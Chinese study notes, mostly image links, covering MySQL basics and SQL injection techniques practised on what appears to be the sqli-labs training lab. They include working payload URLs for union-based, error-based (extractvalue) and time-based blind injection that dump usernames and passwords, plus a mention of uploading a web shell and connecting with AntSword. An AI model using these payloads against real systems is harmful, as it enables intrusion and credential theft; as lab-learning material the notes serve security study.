## 增删改

登录数据库 `mysql -uroot -p`

查看数据库 `show databases;`

创建数据库 `creare database <数据库名>charset utf8`

删除数据库 `drop database <数据库名>`

创建数据表 `create table <数据库名>`

## 数据库查询

![1686670206235](image/SQL/1686670206235.png)

![1686670621759](image/SQL/1686670621759.png)

![1686671869053](image/SQL/1686671869053.png)

![1686671912742](image/SQL/1686671912742.png)

![1686671950093](image/SQL/1686671950093.png)

## SQL注入基础

![1686703581560](image/SQL/1686703581560.png)

![1686703870062](image/SQL/1686703870062.png)

![1686703914643](image/SQL/1686703914643.png)

![1686704528929](image/SQL/1686704528929.png)

![1686704564533](image/SQL/1686704564533.png)

![1686707211907](image/SQL/1686707211907.png)

![1686707167676](image/SQL/1686707167676.png)

![1686706779060](image/SQL/1686706779060.png)

![1686706994634](image/SQL/1686706994634.png)

![1686707088801](image/SQL/1686707088801.png)

![1686709251217](image/SQL/1686709251217.png)

```sql
http://172.20.54.84/Less-2/?id=-1 union select 1,group_concat(column_name),(select group_concat(username,password) from users) from information_schema.columns where table_schema=database() and table_name='users' --+
```

## 报错注入

![1686709473763](image/SQL/1686709473763.png)

![1686710574190](image/SQL/1686710574190.png)

![1686710601191](image/SQL/1686710601191.png)

![1686710682586](image/SQL/1686710682586.png)

![1686712368312](image/SQL/1686712368312.png)

```sql
http://172.28.72.167/Less-5/?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')))--+
```

```sql
http://172.28.72.167/Less-5/?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users )))--+
```

## 布尔盲注

![1686753102842](image/SQL/1686753102842.png)

![1686753129610](image/SQL/1686753129610.png)

## 时间盲注

![1686754378352](image/SQL/1686754378352.png)

```sql
1.http://172.28.72.167/Less-9/?id=1' and if(ascii(substr((select  database()),1,1))=115,sleep(0),sleep(3)) --+  //115=s
2.http://172.28.72.167/Less-9/?id=1' and if(ascii(substr((select  database()),2,1))=101,sleep(0),sleep(3)) --+  //101=e
//重复判断得到数据库名称为 security
```

![1686755732542](image/SQL/1686755732542.png)

![1686755755740](image/SQL/1686755755740.png)

## SQL注入文件上传

![1686756069227](image/SQL/1686756069227.png)

![1686756340257](image/SQL/1686756340257.png)

![1686796376297](image/SQL/1686796376297.png)

> 一句话木马上传后使用蚁剑连接

## POST注入

![1686802321843](image/SQL/1686802321843.png)

![1686802337256](image/SQL/1686802337256.png)

![1686802379810](image/SQL/1686802379810.png)

![1686802397097](image/SQL/1686802397097.png)

![1686802413813](image/SQL/1686802413813.png)
